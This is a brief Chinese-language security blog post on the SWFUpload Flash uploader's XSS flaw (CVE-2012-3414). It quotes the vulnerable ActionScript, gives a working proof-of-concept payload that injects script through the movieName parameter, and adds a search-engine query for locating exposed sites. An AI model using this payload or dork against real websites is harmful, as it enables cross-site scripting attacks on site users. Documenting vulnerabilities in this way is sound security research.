title: SWFUpload
date: 2012-08-13 17:25:26
tags:
- POC
- security
---

<!-- SWFUpload是一个Flash上传插件，曾爆出多个安全问题 -->

#### XSS漏洞(CVE-2012-3414)

```ActionScript
// Get the movie name
this.movieName = root.loaderInfo.parameters.movieName;

// **Configure the callbacks**
// The JavaScript tracks all the instances of SWFUpload on a page.  We can access the instance
// associated with this SWF file using the movieName.  Each callback is accessible by making
// a call directly to it on our instance.  There is no error handling for undefined callback functions.
// A developer would have to deliberately remove the default functions,set the variable to null, or remove
// it from the init function.
this.flashReady_Callback         = "SWFUpload.instances[\"" + this.movieName + "\"].flashReady";
this.fileDialogStart_Callback    = "SWFUpload.instances[\"" + this.movieName + "\"].fileDialogStart";
this.fileQueued_Callback         = "SWFUpload.instances[\"" + this.movieName + "\"].fileQueued";
this.fileQueueError_Callback     = "SWFUpload.instances[\"" + this.movieName + "\"].fileQueueError";
this.fileDialogComplete_Callback = "SWFUpload.instances[\"" + this.movieName + "\"].fileDialogComplete";

this.uploadStart_Callback        = "SWFUpload.instances[\"" + this.movieName + "\"].uploadStart";
this.uploadProgress_Callback     = "SWFUpload.instances[\"" + this.movieName + "\"].uploadProgress";
this.uploadError_Callback        = "SWFUpload.instances[\"" + this.movieName + "\"].uploadError";
this.uploadSuccess_Callback      = "SWFUpload.instances[\"" + this.movieName + "\"].uploadSuccess";

this.uploadComplete_Callback     = "SWFUpload.instances[\"" + this.movieName + "\"].uploadComplete";

this.debug_Callback              = "SWFUpload.instances[\"" + this.movieName + "\"].debug";

this.testExternalInterface_Callback = "SWFUpload.instances[\"" + this.movieName + "\"].testExternalInterface";
this.cleanUp_Callback            = "SWFUpload.instances[\"" + this.movieName + "\"].cleanUp";
this.buttonAction_Callback       = "SWFUpload.instances[\"" + this.movieName + "\"].buttonAction";
```

参数movieName过滤不严导致存在XSS
POC:
    swfupload/swfupload.swf?movieName=%22%5d%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//

Google Dark:
    inurl:swfupload.swf site:cn
